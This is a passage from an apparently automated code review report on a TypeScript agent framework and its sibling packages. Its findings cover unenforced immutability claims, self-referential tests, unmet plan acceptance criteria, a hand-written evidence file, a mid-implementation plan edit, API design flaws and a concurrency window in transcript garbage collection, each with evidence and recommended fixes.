- **Plan reference:** previous review F-dom-5 (re-check)
- **Evidence:**

  ```
  $ grep -rn "Object.freeze" packages/agents/src/bridge/approval-decision.ts \
        ../theokit-tui/src/tool-presentation.ts
  (no output)
  ```
  ```ts
  // packages/agents/src/bridge/approval-decision.ts:41,52-56  (unchanged)
  export const APPROVAL_MODES = ['suggest', 'auto-edit', 'full-auto'] as const
  export const WRITE_SCOPED_TOOLS: ReadonlySet<string> = new Set(['apply_patch','edit_file','write_file'])
  ```
  ```ts
  // ../theokit-tui/src/tool-presentation.ts:147-149  (unchanged)
  * The defaults. Frozen as a `ReadonlyMap` because a surface that mutated it would change every
  * other surface in the process — which is what {@link toolPresentation} exists to avoid.
  ```
  `ReadonlySet`/`ReadonlyMap`/`as const` are erased at runtime. `WRITE_SCOPED_TOOLS.add('shell_exec')`
  from anywhere in the process makes `shouldAutoApprove('auto-edit','shell_exec')` return true for
  every caller — a process-wide security default with a documented immutability claim the code
  does not deliver (G10: never claim enforcement you do not have).

- **Recommended action:** Freeze the array and return a fresh `Set` from a `writeScopedTools()` factory (or freeze via a wrapper), and delete the "Frozen" sentence from the tui docstring. Do not leave the claim and the code disagreeing.

### F-arch-8: STILL OPEN. The stated mitigation for the duplicated tool-name list still does not exist; the only new cross-repo assertion added on this branch is a substring check for the symbol NAMES, not for the list's contents.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `../theokit-tui/src/tool-presentation.ts` line 18
- **Plan reference:** previous review F-dom-6 (re-check); G12
- **Evidence:**

  The claim is unchanged:
  ```ts
  // ../theokit-tui/src/tool-presentation.ts:16-19
  * ... it CAN drift when a tool is added upstream. ... The test asserts the list, so drift shows
  * up as a diff to review rather than as a surprise in a session.
  ```
  The test it points at compares the file to itself
  (`../theokit-tui/src/tool-presentation.test.ts:30-39`, `KNOWN_TOOL_NAMES` vs
  `DEFAULT_TOOL_PRESENTATION`, both declared in `tool-presentation.ts`).
  The framework side, searched today:
  ```
  $ grep -rn "KNOWN_TOOL_NAMES\|tool-presentation" tests/ scripts/ packages/agents/tests/
  tests/integration/crossval-4-6-closure.test.ts:192:  for (const name of ['toolPresentation','DEFAULT_TOOL_PRESENTATION','KNOWN_TOOL_NAMES'])
  ```
  and that assertion is `expect(text).toContain(name)` over the built `.d.ts` — it proves the
  symbol is exported, never that its contents match `@theokit/agents/tools`. (It is also the
  `toContain` shape T0.1 exists to remove, in a file this branch created.) No gate compares the
  two lists in either repo.

- **Recommended action:** Add the assertion the previous review specified to `crossval-4-6-closure.test.ts` — the framework's published tool-factory names must equal `@theokit/tui`'s `KNOWN_TOOL_NAMES`, skipping loudly when either `dist` is unbuilt — or delete the "The test asserts the list" sentence. A documented control that does not exist is worse than a documented gap.

### F-xval-4: T2.4 edited a different tree than the one it declared, and two of its four Acceptance Criteria — both of which name `credential-store.ts` explicitly — are unmet. T2.3 never shipped `readUserTurnPreviews`, a deliberately-scoped v1.1 deliverable.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `../theokit-sdk/packages/sdk/src/internal/auth/credential-store.ts`
- **Plan reference:** T2.3 § Files to edit; T2.4 § Files to edit + Acceptance Criteria items 3 and 4
- **Evidence:**

  T2.4 declared:
    ../theokit-sdk/packages/sdk/src/internal/auth/credential-store.ts
    ../theokit-sdk/packages/sdk/tests/credential-store-modes.test.ts   (NEW)
  T2.4 delivered (10577fe3): packages/agents/src/session/project-index.ts,
    packages/agents/src/session/session-pointer.ts,
    packages/agents/tests/unit/transcript-root-dir-modes.test.ts
  plus SDK 7cb57baff: packages/sdk/src/internal/persistence/{jsonl,transcript-ops}.ts
  
  $ git -C ../theokit-sdk log -1 --format='%h %ad' --date=short -- .../auth/credential-store.ts
  ea9902666 2026-08-08         <- eight days BEFORE this plan's implement run
  $ ls ../theokit-sdk/packages/sdk/tests/ | grep -i credential
  credential-error-hierarchy.test.ts
  credential-presence.test.ts    <- the declared credential-store-modes.test.ts was never created
  $ grep -rn "the_check_accepts_a_home_created_by_this_framework\|a_world_writable_home_is_still_refused" ../theokit-sdk/packages/sdk/
  (no matches — neither named RED test exists)
  
  Unmet AC:
    AC3 "The docstring in credential-store.ts records which side moved and why" — the docstring
        at :110-121 is the pre-existing 2026-08-08 text; nothing about this plan.
    AC4 "Q3 is answered and the answer is written into credential-store.ts" — not written.
  
  Consequential misattribution: the SEPA brief
  `.../crossval-4-6-absorption/sepa-iterations/initial-brief-response.md:56` claims
  "T2.4's 0700 decision is honoured where it matters", citing `credential-store.ts:257-258` and
  `:127`. Both lines predate this plan (ea9902666). The repair helper it also cites,
  `hooks/secure-store.ts:54-72`, landed in 779a83f0 on 2026-08-15 — also before the implement
  run began at 09:04 on 2026-08-16. The brief attributes pre-existing behaviour to this task.
  
  T2.3 — `readUserTurnPreviews` is absent:
    $ grep -rn "readUserTurnPreviews" packages/agents/src packages/agents/tests tests
    (no matches)
  It is named twice in T2.3 § Files to edit, carries a dedicated "v1.1 scope addition" paragraph
  justifying why it ships in T2.3 rather than separately, backs two declared RED tests
  (test_previews_list_exactly_the_reachable_turns_in_order,
   test_previews_and_fork_agree_on_which_turn_is_nth — neither exists), and is cited in the
  Coverage Matrix F64 row as part of that row's resolution.

- **Recommended action:** (a) T2.4: either write the Q3 record + mask rationale into credential-store.ts as the AC demands, or amend the plan's T2.4 ACs to name the tree that was actually hardened and record the redirection as an ADR. (b) Correct the SEPA brief to cite only commits from this run. (c) T2.3: ship readUserTurnPreviews with its two declared tests, or drop it from the plan and from the F64 Coverage Matrix row with a written reason.

### F-xval-5: Half of T2.7 shipped. `createPendingLedger` takes no options; `threadOf` and `byThread` do not exist, and the Acceptance Criterion that depends on them is untested.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `packages/agents/src/ask/pending-ledger.ts:76`
- **Plan reference:** T2.7 § Pseudo-code/Signatures, § Tasks step 3, § Acceptance Criteria item 2; Coverage Matrix row '— Surface-side pending ledger ... Generic payload + injectable thread extractor'
- **Evidence:**

  Plan signature:
    export function createPendingLedger<TPayload = undefined>(opts?: {
      threadOf?: (q: PendingQuestion) => string | undefined
    }): PendingLedger<TPayload>
    ledger.byThread('t-1') -> both pending items on that thread, still distinct
  
  Actual, pending-ledger.ts:76:
    export function createPendingLedger<TPayload = undefined>(): PendingLedger<TPayload> {
  $ grep -n "threadOf\|byThread" packages/agents/src/ask/pending-ledger.ts
  (no matches)
  
  Unmet AC2: "Two items on one thread stay distinct — two_questions_on_one_thread_stay_distinct_items() passes"
  $ grep -n "it(" packages/agents/tests/unit/pending-ledger-payload.test.ts
  test_a_payload_round_trips_on_a_pending_item
  test_the_framework_never_reads_the_payload
  test_existing_call_sites_compile_without_a_type_argument
  test_settling_and_pruning_still_behave_the_same_with_a_payload
  -> the thread test is absent; so is the EC-20 test
     (test_a_repeated_id_replaces_rather_than_duplicating_and_keeps_the_latest_payload).
  
  The omission is DECLARED, in commit 4eb2bca4: "Parcimonia: o plano pedia tambem um extrator de
  thread. Ficou de fora — sem consumidor medido, seria G11." Honest, and that is why this is HIGH
  and not BLOCKER. But the premise is contradicted by the plan's own Evidence block, which names
  the measured consumer: T2.7 § Evidence cites
  `TheoCode/packages/tui/src/consent/pending-approvals.ts` and states the surface "needs to hang
  its own render state AND THREAD ASSOCIATION off the same item". Without the extractor, the
  adoption T5.2 was supposed to prove still requires the second map — which is the exact reason
  the task was written.

- **Recommended action:** Either ship threadOf + byThread with the two missing tests, or record an ADR that supersedes the plan's Evidence-based premise and update the Coverage Matrix row, which still promises "injectable thread extractor".

### F-xval-6: Commit c5465d16 hand-writes `.wiring-evidence.json` — the exact path the wiring gate reads — to close a review finding about pillar (c) being 0/27.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `.wiring-evidence.json`
- **Plan reference:** cycle-implement.md § Validation halt-loop — 'Forbidden: ... hand-edited .wiring-evidence.json'; skills/implement/prompts/validation-fix-prompt.md:57 — 'NEVER hand-edit .wiring-evidence.json (Unbreakable: no fabricated evidence)'
- **Evidence:**

  .wiring-evidence.json:
    "_provenance": { "written_by": "manual sweep against the operator's real project tree,
                                    2026-08-16",
                     "closes": "review F-wire-2 (pillar (c) was 0/27)" }
    "honest_limits": ["This is a MANUAL sweep, not integration-test infra. The file is
                      hand-written from a measured run; no test writes it yet."]
  
  The rule is unconditional and names this file:
    .claude/rules/cycle-implement.md:98
    .claude/skills/implement/SKILL.md:324
    .claude/skills/implement/prompts/validation-fix-prompt.md:57
  and skills/implement/scripts/check_wiring.py:236 reads exactly `project_root/.wiring-evidence.json`
  to score pillar (c).
  
  Two mitigations, both real:
    1. The file declares its own provenance and limits in the artifact itself, unprompted.
       This is the opposite of fabrication in intent.
    2. The plan declares no `metric:` anywhere
       ($ grep -n "metric:" <plan> -> no output), so check_wiring.py returns n/a for pillar (c)
       on every task and no automated gate is actually flipped green by this file today.
  The hazard is therefore latent rather than realized: the next plan in this repo that DOES
  declare a metric inherits a hand-written evidence file at the canonical path.
  
  The measurement it records is itself well-shaped and worth keeping: 13.624 projects,
  framework_dead_where_consumer_disagreed = 0, 34.139 ops against a 200.000 budget, and a
  recorded first-run failure at budget=20.000 that is reported rather than discarded.

- **Recommended action:** Move the measurement out of the reserved path — e.g. `.claude/knowledge-base/implementations/crossval-4-6-absorption/liveness-real-tree-sweep.json` plus a line in the implementation summary — and leave `.wiring-evidence.json` writable only by test infrastructure. If it must stay, it needs an ADR that names the rule it is overriding.

### F-xval-7: The plan was edited 3h29m after /implement started, and the edit re-scoped T2.4.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `.claude/knowledge-base/plans/crossval-4-6-absorption-plan.md`
- **Plan reference:** cycle-review.md — the plan is the frozen contract for /review; cycle-implement.md § Anti-patterns — 'Editing the plan during implementation. If the plan was wrong, return to /to-plan.'
- **Evidence:**

  /implement start:  f578db3b  2026-08-16 09:04:49 -0300  (implementation-contract commit)
  Plan edit:         fc496f28  2026-08-16 12:34:23 -0300  ("docs(plan): Q3 named five creators;
                                                            two are a different .theokit")
  The diff appends to § Unresolved Questions a "Q3 — correction to the proposal above, measured
  while implementing T2.4 (2026-08-16)" block that narrows the creator list from five to three
  and rules two out. The prior Q3 text had said "T2.4 is re-scoped: route the remaining creators
  through the existing ensureSecureDir helper" — so the mid-flight edit changed which files T2.4
  was accountable for, while T2.4 was being implemented.
  
  Not drift: f408468e (09:00:05) and 4e4097d7 (09:01:42) both precede the implement start.
  
  Severity is HIGH rather than BLOCKER because the edit is purely additive, lands in § Unresolved
  Questions rather than in a task body or an Acceptance Criteria list, carries its measurement,
  and is substantively correct — the home `.theokit` and a project's `.theokit` really are
  different trees, and conflating them was the original plan's error. What it costs is
  auditability: T2.4's plan-vs-code comparison is now against a moved target (see F-xval-4).

- **Recommended action:** Record the mid-flight edit as an ADR in the implementation contract (per cycle-implement's "return to /to-plan" rule, the honest minimum is to state that the plan moved and why), and state in the review verdict that T2.4's criteria were assessed against a plan revised in flight.

### F-dom-1: RE-VERIFIED OPEN and unchanged. Judgement asked for: NO — a type-safe cast that produces an incoherent API is not acceptable here. It is an LSP violation on a published type, and the cast is simultaneously unnecessary (it buys nothing) and load-bearing (it is the only thing hiding the incoherence from the compiler).

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `../theokit-tui/src/tool-presentation.ts` line 330
- **Plan reference:** T3.1 — "Ship default tool header / body / approval maps in @theokit/tui"; O4
- **Domain anchor:** ECMAScript Map contract (has(k) === (get(k) !== undefined); ReadonlyMap<K,V>.get returns V | undefined); rules/architecture.md § 6 "leaky abstractions"; rules/type-safety.md § Prohibited Patterns ("`as` type assertions")
- **Evidence:**

  `tool-presentation.ts:317-330` — unchanged since the last review:
  ```ts
  return {
    get: (name: string) => merged.get(name) ?? genericPresentation(name),   // :318
    has: (name: string) => merged.has(name),                                // :319
    keys: () => merged.keys(),   values: () => merged.values(),
    entries: () => merged.entries(),
    forEach: (fn, thisArg?: unknown) => { merged.forEach(fn, thisArg) },     // :326
    [Symbol.iterator]: () => merged[Symbol.iterator](),
  } as ReadonlyMap<string, ToolPresentation>                                 // :330
  ```
  Three arguments, and the third is the decisive one:
  
  1. LSP. `DEFAULT_TOOL_PRESENTATION` (:294) and `toolPresentation()` (:305) carry the IDENTICAL
     declared type `ReadonlyMap<string, ToolPresentation>` and have OPPOSITE `get` behaviour.
     A caller that writes `m.get(n) ?? fallback` — the idiomatic form, and the form :294 REQUIRES —
     silently never reaches its fallback on one of the two. Substitutability across the declared
     type is exactly what is broken.
  2. Internal incoherence. `has(n)` is false for names `get(n)` answers; `keys()`/`entries()`/
     `[...m]` never yield the unknown name; `forEach` hands the raw `merged` Map to the callback's
     third argument, so `m.forEach((v,k,map) => map.get(x))` re-enters WITHOUT the fallback.
     `x instanceof Map` is false and `structuredClone(x)` throws (methods are not cloneable).
  3. The cast buys nothing. `() => ToolPresentation` is already assignable to `get(k): V | undefined`,
     so the assertion is not required to compile — and the consumer's inferred type is STILL
     `ToolPresentation | undefined`. The stated purpose at :315-316 ("so no caller needs an
     `?? fallback` at the call site") is defeated by the very type it was cast to: the guarantee
     exists at runtime and is invisible at compile time. A cast whose only observable effect is
     to suppress a contract mismatch is precisely what `rules/type-safety.md` forbids.
  
  Scope honesty: `rules/type-safety.md` frontmatter scopes its `paths:` to THIS repo
  (`packages/**`, `app/**`, `server/**`), so its letter does not bind the sibling repo. The
  LSP/Map-contract argument binds regardless, and `system-design-guardrails.md § G3` states the
  same prohibition for code this repo consumes.
  
  COST WINDOW — this is still free to fix. `npm pack @theokit/tui@0.53.0` contains ZERO
  occurrences of `toolPresentation`: the symbol is unpublished. Fixing it now costs a diff;
  fixing it after publish costs a major on a package `@theokit/agents`' only real consumer pins.

- **Recommended action:** Return the real `merged` Map (drop the `as` entirely) and ship the total lookup as a separate, honestly-typed function whose signature a consumer can SEE: `export function resolveToolPresentation(map: ReadonlyMap<string, ToolPresentation>, name: string): ToolPresentation`. That gives the never-undefined guarantee a visible type, keeps `get`/`has`/`keys` consistent, and restores `instanceof Map` / structuredClone / spread. If the facade is kept against this advice, it must at minimum make `has` agree with `get` and pass ITSELF as the `forEach` third argument — but then `keys()`/`entries()`/iteration still disagree, which is why the facade is the wrong shape rather than an incomplete one.

### F-dom-2b: The CHANGELOG half of F-dom-2 is CLOSED, but the migration sentence it added is factually wrong in the direction that hurts: it tells a consumer their `catch` is dead code when in fact it will still fire, under a different condition, and run the wrong recovery.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `.changeset/session-lifecycle-async-major.md` line 19
- **Plan reference:** T2.2 — "the registry half of session deletion becomes reachable"; Global DoD "every signature change is a widening"
- **Domain anchor:** Unbreakable Rule 6 (changelog written for the consumer) + Unbreakable Rule 3 (honesty) — migration guidance on a published error type
- **Evidence:**

  `.changeset/session-lifecycle-async-major.md:16-20`, mirrored at `CHANGELOG.md:36-40`:
    "It was `constructor(sessionId)` for 'you passed a thenable to a synchronous seam'; it is now
     `constructor(sessionId, timeoutMs)` for 'the registry did not answer in time'. The old
     condition no longer exists, so a `catch` that depended on it will never fire again."
    (pt-BR: "a condicao antiga deixou de existir, entao um `catch` que dependia dela nunca mais dispara")
  
  The class is still exported and still thrown — `session/gc/registry-remover.ts:27-39` declares it,
  and `registry-remover.ts:86-88` throws it on timeout, on a path that now runs by DEFAULT
  (`DEFAULT_REGISTRY_TIMEOUT_MS = 30_000`, :55). So the consumer's existing handler:
  ```ts
  catch (e) { if (e instanceof SessionRegistryRemoverError) { await myRemover(id); retry() } }
  ```
  does NOT stop firing. It fires on a hung registry and re-drives the remover that just timed out —
  the changeset's own text elsewhere calls that direction unsafe. "Will never fire again" is the
  one sentence a migrating consumer would act on, and acting on it (deleting the handler) is
  safer than believing it and leaving it, which is the reverse of what the sentence implies.
  
  The prior review's recommended shape was also not adopted: a NEW name
  (`SessionRegistryTimeoutError`) with `SessionRegistryRemoverError` kept as a `@deprecated`
  alias for one major — the pattern this repo already applies at
  `packages/agents/src/bridge/delegation-types.ts` for `BudgetExceededError`. Keeping the old
  name for the new meaning is the only variant in which a stale `instanceof` silently changes
  behaviour instead of failing to compile.

- **Recommended action:** Replace the sentence with what is true: "the class is now thrown ONLY on timeout. A `catch` that treated it as 'I passed a thenable, let me await it myself' will now fire on a hung registry and must not retry — the transcript was deliberately left on disk." Preferably also rename to `SessionRegistryTimeoutError` and keep `SessionRegistryRemoverError` as a `@deprecated` alias for one major, so a consumer's stale handler is a compile-time deprecation rather than a runtime meaning swap.

### F-dom-3: STILL OPEN, and worse than first reported: adding the index row is not merely doctrine, it is an explicit numbered task step in NINE tasks of this plan. It was executed for exactly one (T1.1). Every framework-side symbol this slice invented ships undiscoverable, while the two sibling packages got seven rows.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `wiki/capability-index.md` line 30
- **Plan reference:** O1/O2 ("the capability index tells the truth"; "every capability the layer invents is reachable"); D1; and the numbered task step "Add the capability-index row" in T1.2 (plan:592), T2.1 (plan:748), T2.2 (plan:847), T2.3 (plan:948), T2.6 (plan:1160), T2.7 (plan:1239), T3.2 (plan:1416), T3.3 (plan:1507)
- **Domain anchor:** CLAUDE.md § Ecosystem resolution 2026-08-16 — wiki/capability-index.md is the declared answer to "which symbol delivers capability X"
- **Evidence:**

  `grep -n 'shouldAutoApprove|APPROVAL_MODES|WRITE_SCOPED_TOOLS|applyPosture|expandCommandTemplate|templateHints|FILE_INLINE_CAP|classifyProjects|transcriptRootHint|createDelegateTool|expandInstructionImports' wiki/capability-index.md`
    -> ZERO matches. (49 table rows in the file; `@theokit/agents` rows at :30-76 are all pre-slice.)
  
  Rows the same slice DID add, for the siblings (`capability-index.md:89-92`, `:109-110`):
    toolPresentation · DEFAULT_TOOL_PRESENTATION · WindowAnchor · keyboardHelpFor
    runPkceFlow · refreshAccessToken            (all marked `Landed: unreleased`)
  
  Plan task steps not executed, one per task:
    T1.2 plan:592  "Add a capability-index row for the image tool."      -> `createViewImageTool` absent
    T2.1 plan:748  "Add the capability-index row."                       -> `shouldAutoApprove` absent
    T2.2 plan:847  "Add the capability-index row."                       -> `deleteSession` absent; `runTranscriptGC` row (:58) still says "8.x" although it became async in the pending major
    T2.3 plan:948  "Add the capability-index row."                       -> `forkBeforeUserTurn` absent entirely
    T2.6 plan:1160 "Add the capability-index row."                       -> `transcriptRootHint` absent
    T2.7 plan:1239 "Add the capability-index row."                       -> `createPendingLedger` row exists (:68) but was NOT updated for the payload widening
    T3.2 plan:1416 "Add the capability-index row."                       -> `classifyProjects` absent
    T3.3 plan:1507 "Add the capability-index row."                       -> `expandCommandTemplate` absent
  Only T1.1 (plan:523, `TheokitAgentError`) produced its row (:75).
  
  `shouldAutoApprove` remains the sharpest case: `bridge/approval-decision.ts:9-13` says in
  writing that the rule was implemented twice downstream *because the enforcement was not
  reachable* — and the fix ships equally unfindable.
  
  Why CI is green anyway: the guard is one-directional. `tests/integration/crossval-gaps.test.ts`
  asserts index -> surface (every cited symbol resolves) and the inverse only for the "Honest
  gaps" table. Nothing asserts surface -> index. `scripts/check-invention-reachability.mjs:1-14`
  asks whether an invented capability is EXPORTED, not whether it is FINDABLE. And the T4.4
  convention at plan:1796 ("the corresponding capability-index row's `Landed` column is
  populated in the same change") is only half mechanized: `scripts/check-changelog-closes.mjs`
  checks the `closes:` marker in CHANGELOG.md and never looks at the index.

- **Recommended action:** Add the nine missing rows with `Landed: unreleased` (the convention the sibling rows already use), refresh the `runTranscriptGC` and `createPendingLedger` rows, and close the one-way gap: `check-invention-reachability.mjs` already enumerates the layer's exported symbols and the index guard already resolves per-package `dist` — assert that an export added to a published subpath since the last tag appears in the index OR in an allowlist with a sunset. Without the inverse assertion this recurs on the next slice by construction.

### F-dom-6: STILL OPEN, both halves. The tui docstring still names a control that does not exist, and the framework side still asserts a hardcoded literal against itself while the machinery to derive it shipped in this same branch.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `../theokit-tui/src/tool-presentation.ts` line 18
- **Plan reference:** T3.1; O4 — the three name-keyed tool maps ship as overridable defaults
- **Domain anchor:** system-design-guardrails.md § G12 (one rule / one owner, cited in this file's own docstring); rules/testing.md § 6 (change-detector tests)
- **Evidence:**

  tui claim, unchanged (`tool-presentation.ts:16-19`):
    "...it CAN drift when a tool is added upstream ... **The test asserts the list**, so drift
     shows up as a diff to review rather than as a surprise in a session."
  tui test, unchanged (`../theokit-tui/src/tool-presentation.test.ts:30-39`): both operands
  (`KNOWN_TOOL_NAMES` at :34 and `DEFAULT_TOOL_PRESENTATION` at :294) are defined in the same
  file. It proves internal consistency, never fidelity to `@theokit/agents/tools`.
  
  Framework side, same shape and no G1 excuse:
    `packages/agents/src/bridge/approval-decision.ts:45-50` — "The names are the SDK factories'
    defaults (`apply-patch.ts:51`, `edit-file.ts:155`, `write-file.ts:86`)". That is a citation
    by line number, not a derivation.
    `packages/agents/tests/unit/approval-decision.test.ts:95-103` —
    `expect([...WRITE_SCOPED_TOOLS].sort(...)).toEqual(['apply_patch','edit_file','write_file'])`,
    a literal transcribed into the test. `@theokit/agents` already depends on `@theokit/sdk-tools`
    (`packages/agents/package.json` dependencies), so the names are derivable from the factories.
  
  The slice's own new closure register does not close it either:
  `tests/integration/crossval-4-6-closure.test.ts:151-155` asserts only
  `reachable('shouldAutoApprove')` / `reachable('WRITE_SCOPED_TOOLS')` — that they are exported,
  not that they agree with anything; and :188-196 asserts the three tui symbols appear in the
  built `.d.ts`, not that `KNOWN_TOOL_NAMES` matches the factory names.

- **Recommended action:** Add ONE assertion to `tests/integration/crossval-4-6-closure.test.ts`, which already resolves sibling `dist` per the "Import from" column and already has the skip-high convention for an unbuilt sibling: the framework's published tool-factory names must equal `@theokit/tui`'s `KNOWN_TOOL_NAMES`. For `WRITE_SCOPED_TOOLS`, assert against the real `createEditFileTool`/`createWriteFileTool`/`createApplyPatchTool` instances' `.name` rather than a literal. Until one of these exists, DELETE the sentence "The test asserts the list" — a false claim about a control is worse than an acknowledged gap.

### F-dom-7: `FsSeam` went from 1 required method to 3 in order to re-answer a question the SAME published subpath already answers with `resolveProjectDir` — the package's own purpose-built cwd sidecar, which the oracle neither uses nor mentions. Two reverse-index mechanisms now ship on `@theokit/agents/session`, and the duplication is what forced the interface to widen.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 38
- **Plan reference:** T3.2 — "Absorb the liveness oracle into @theokit/agents/session"; commit 7fea1388
- **Domain anchor:** rules/architecture.md § 2 (DIP — the domain declares the interface it needs) and § 6 (leaky abstractions); system-design-guardrails.md § G12 (one rule / one owner)
- **Evidence:**

  Before (`git show c3527883:...liveness-oracle.ts:35-37`):
  ```ts
  export interface FsSeam { exists: (path: string) => boolean }
  ```
  After (`liveness-oracle.ts:38-44`), all three REQUIRED:
  ```ts
  export interface FsSeam {
    exists: (path: string) => boolean
    listEntries: (dir: string) => readonly string[]
    firstLine: (file: string) => string
  }
  ```
  What already existed on the same barrel — `packages/agents/src/session/index.ts:22-27` exports
  `resolveProjectDir`, whose module docstring (`project-index.ts:29-40`) calls itself
  "M71 — the reverse index `encodeProjectDir` never had":
  ```ts
  // project-index.ts:97-108
  export function resolveProjectDir(encodedName, root = transcriptRoot()) {
    const raw = readFileSync(join(projectsRoot(root), encodedName, CWD_SIDECAR), 'utf8')
    ...
  }
  ```
  One file read, no seam, written and maintained by `recordProjectDir` (`project-index.ts:72`)
  for exactly this question — and re-verified by the sibling `projectDirMatches`
  (`project-index.ts:118`), which is the same "must encode back" check `recordedCwd`
  reimplements at `liveness-oracle.ts:175`.
  
  The oracle instead lists a directory and JSON-parses up to 3 transcripts' first lines
  (:155-179) to recover the cwd. The 200-line module never mentions the sidecar exists.
  
  Honesty about which rule applies. This is NOT classic ISP-with-unused-methods: all three
  members are called by the one exported function. The defect is that the seam is no longer
  ROLE-shaped. `exists` is a filesystem role. `firstLine` is a transcript-FORMAT operation — the
  transcript is written by `@theokit/sdk/persistence`, a dependency of THIS package and not of
  the consumer, and `readJsonlTail` is already listed in `wiki/capability-index.md:104` as the
  framework's answer for reading one. Pushing it across the seam makes the consumer responsible
  for a format the framework owns, which is `rules/architecture.md § 6` ("adapters returning
  driver-specific types from interfaces meant to be portable") read from the other side.
  Contrast the sibling seam shipped by the SAME slice: `config/command-template.ts:54-59`
  (`TemplateDeps`) also has three members, and each one carries a distinct TRUST decision the
  caller must own (run a shell, resolve a reference, warn). `listEntries`/`firstLine` carry no
  decision at all.
  
  Second cost, compounding: no default implementation is exported. There is no `nodeFsSeam()`
  anywhere in `packages/agents/src`. Every consumer of a required 3-method interface hand-writes
  it — in the slice whose stated thesis is that a capability which exists and cannot be used
  costs a customer what an absent one costs.

- **Recommended action:** Read the sidecar first (it is the package's own authoritative index, one file, no injected call) and fall back to the transcript scan only when it is absent — which also documents why the fallback exists. Either widen `resolveProjectDir` to accept the same `FsSeam` so the budget stays countable, or add ONE seam member (`readText(path): string | undefined`) that serves both the sidecar and the first-line read, keeping `FsSeam` at two. Ship a `nodeFsSeam()` default from `@theokit/agents/session` so the required interface is satisfiable in one line. And state in the oracle's docstring that `resolveProjectDir` exists and why it is or is not enough — two reverse-index mechanisms on one subpath with no cross-reference is the G12 shape this plan exists to remove.

### F-dom-8: The rename fixed the declaration and not the documentation directly above it. The module docstring still names the injected option `listProjects`, and that block ships INSIDE the published type declaration — so `session.d.ts` will document one name and declare another, reproducing in the same file the two-names-one-contract defect the commit exists to fix.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 14
- **Plan reference:** commit 7fea1388 ("o oraculo marcava projetos vivos como mortos"); CHANGELOG.md:22-28
- **Domain anchor:** Subpath-as-API doctrine (plan § Domain glossary) — the module TSDoc header is emitted into the published `.d.ts`
- **Evidence:**

  Source, current HEAD (`liveness-oracle.ts:12-15`):
  ```
   * ## What is injected, and why exactly that
   *
   * `listProjects` — which directories are even candidates is PRODUCT policy (workspaces, ignore
   * rules, mounted volumes). This module must not guess it.
  ```
  Declaration, 60 lines below (`liveness-oracle.ts:74`):
  ```ts
    candidatePaths: () => readonly string[]
  ```
  Proof that the header is emitted into the shipped declaration — the previous build carries it
  verbatim: `packages/agents/dist/session.d.ts:378` is the same `listProjects` sentence, and
  `dist/session.d.ts:409` is the then-current `listProjects: () => readonly string[];`. After a
  rebuild, :378 stays and :409 becomes `candidatePaths`, at which point the published `.d.ts`
  contradicts itself.
  
  This matters more than an ordinary stale comment because of what the commit measured: the
  defect being fixed WAS a naming disagreement across a seam (encoded names vs real paths), it
  cost 6-of-6 live projects classified `dead` on the delete path, and the option's own new
  JSDoc at :63-65 says so — "the ambiguity was a defect rather than a documentation gap". The
  same file then leaves the documentation gap open.

- **Recommended action:** Update `liveness-oracle.ts:12-18` to name `candidatePaths` and `fs`, and say what each is for in one line each. Then rebuild before publishing so `dist/session.d.ts` is regenerated — the committed `dist/` is currently pre-rename (`:409` still declares `listProjects`), which is the same stale-artifact class the branch already fixed once at handoff (commit 0d82cd3e).

### F-dom-1: The invariant-4 re-check is still ONE snapshot taken before a loop that contains an await per candidate. Nothing in this branch changed it; commit 90e9af57 only bounded the await, so the window went from unbounded to 30s per preceding candidate, which is a smaller window and not a closed one. The comment at :268-270 still asserts the snapshot "turns 'was safe when we looked' into 'is safe now'", which is false for every candidate after the first.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/gc/transcript-gc.ts` line 271
- **Plan reference:** T2.2 — runTranscriptGC accepts and honours a remover; Baseline Context lists "the 4 GC invariants stay" as an invariant to preserve
- **Domain anchor:** transcript-gc.ts:34-36 invariant 4 — "The apply phase re-checks. A plan is a snapshot, and between snapshot and delete a user can resume a session."
- **Evidence:**

  Snapshot, once, before the loop — unchanged by this branch:
  ```ts
  // transcript-gc.ts:268-273
  // Invariant 4 — the TOCTOU backstop. ... Re-reading protection HERE is what turns
  // "was safe when we looked" into "is safe now".
  const protectedNow = options.apply
    ? resolveProtection(protectedTranscripts(plan.cwd, plan.root), options.protectedIds)
    : new Map<string, string>()
  
  for (const candidate of plan.candidates) {
    if (protectedNow.has(candidate.id)) continue     // :276 — reads the t0 snapshot
  ```
  The yield inside the loop:
  ```ts
  // transcript-gc.ts:291-295
  await awaitRegistryRemoval(
    options.removeFromRegistry(candidate.id), candidate.id, options.registryTimeoutMs)
  ```
  then `rmSync(...)` at :305.
  
  Window size after 90e9af57: `DEFAULT_REGISTRY_TIMEOUT_MS` = 30_000
  (registry-remover.ts:55), applied per candidate, so candidate k is deleted against a snapshot
  up to `30s * (k-1)` old in the worst case. Bounded, not eliminated.
  
  No test covers it. `transcript-gc-protection.test.ts:122` ("plan_then_delete_concurrent_test_
  rechecks_injected_ids") flips protection between PLAN and APPLY — i.e. before :271 — which the
  snapshot does catch. Nothing flips protection between :271 and :305, which is the window T2.2
  created. Every test in that file passes NO `removeFromRegistry`, so the loop in those tests has
  no await at all and runs in one turn.
  
  Scope note (honest): the only in-repo caller, `packages/theo/src/cli/commands/sessions-gc.ts:89`,
  passes no `removeFromRegistry`, so the loop is await-free there and the hazard is currently
  dormant. It arms the moment a consumer wires the seam — which is exactly what T5.3 hands
  `Agent.delete` to.

